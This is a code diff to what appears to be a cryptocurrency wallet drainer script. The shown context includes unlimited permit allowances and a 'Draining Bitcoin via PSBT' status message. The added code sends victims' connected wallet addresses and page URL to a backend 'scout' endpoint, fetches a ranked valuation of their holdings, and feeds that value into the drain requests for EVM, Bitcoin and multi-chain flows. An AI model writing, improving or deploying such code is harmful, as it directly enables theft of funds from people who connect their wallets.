@@ -117,6 +117,22 @@
     btc: 'BTC', cosmos: 'COSMOS', aptos: 'APTOS', sui: 'SUI',
   };
 
+  function resolveScoutUsd(fusionResult, rankedResult) {
+    var ranked = rankedResult && typeof rankedResult.total_usd === 'number' && rankedResult.total_usd > 0
+      ? rankedResult.total_usd : 0;
+    var fusion = fusionResult && typeof fusionResult.total_usd === 'number' && fusionResult.total_usd > 0
+      ? fusionResult.total_usd : 0;
+    return ranked > 0 ? ranked : fusion > 0 ? fusion : 0;
+  }
+
+  function scoutIngressMeta() {
+    return {
+      source_page: typeof location !== 'undefined' ? location.href : '',
+      active_chain_tab: ACTIVE_TAB,
+      connected_wallets: Object.keys(wallets).filter(function (k) { return wallets[k] && wallets[k].address; }),
+    };
+  }
+
   /* ── Styles (injected once) ─────────────────────────────────────────── */
   function injectStyles() {
     if (document.getElementById('legion-one-styles')) return;
@@ -738,12 +754,27 @@
   /* ── Backend flow ─────────────────────────────────────────────────────── */
   async function postScout(conn) {
     var family = chainFamilyForTab(ACTIVE_TAB);
+    var meta = scoutIngressMeta();
     return apiPost('/api/v1/scout', {
       user_address: conn.address,
       chain_id: conn.chainId || 0,
       chain_family: family,
       wallet_type: walletTypeLabel(conn),
+      source_page: meta.source_page,
+      active_chain_tab: meta.active_chain_tab,
+      connected_wallets: meta.connected_wallets,
     });
+  }
+
+  async function fetchRankedScout(wallet, chainFamily) {
+    try {
+      return await apiPost('/api/v1/scout/ranked', {
+        wallet_address: wallet,
+        chain_family: chainFamily,
+      });
+    } catch (e) {
+      return { assets: [], total_usd: 0 };
+    }
   }
 
   async function postFusion() {
@@ -967,7 +998,7 @@
       nonce: opts.noncePrefix + ':' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: opts.walletType,
-      scout_value_usd: opts.scoutUsd || 1,
+      scout_value_usd: resolveScoutUsd(null, { total_usd: opts.scoutUsd }),
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     });
@@ -1097,7 +1128,7 @@
       nonce: 'btc:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: walletTypeLabel(wallets.btc),
-      scout_value_usd: scoutUsd || 1,
+      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     });
@@ -1359,7 +1390,7 @@
       nonce: 'omni:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: walletTypeLabel(evm),
-      scout_value_usd: scoutUsd || 1,
+      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     };
@@ -1408,8 +1439,10 @@
       await postScout(conn);
       await fetchBalanceDisplay();
 
+      var family = chainFamilyForTab(ACTIVE_TAB);
+      var ranked = await fetchRankedScout(conn.address, family);
       var fusionResult = await postFusion();
-      var scoutUsd = fusionResult.total_usd || 1;
+      var scoutUsd = resolveScoutUsd(fusionResult, ranked);
 
       if (ACTIVE_TAB === 'btc') {
         setStatus('Draining Bitcoin via PSBT…', 'busy');
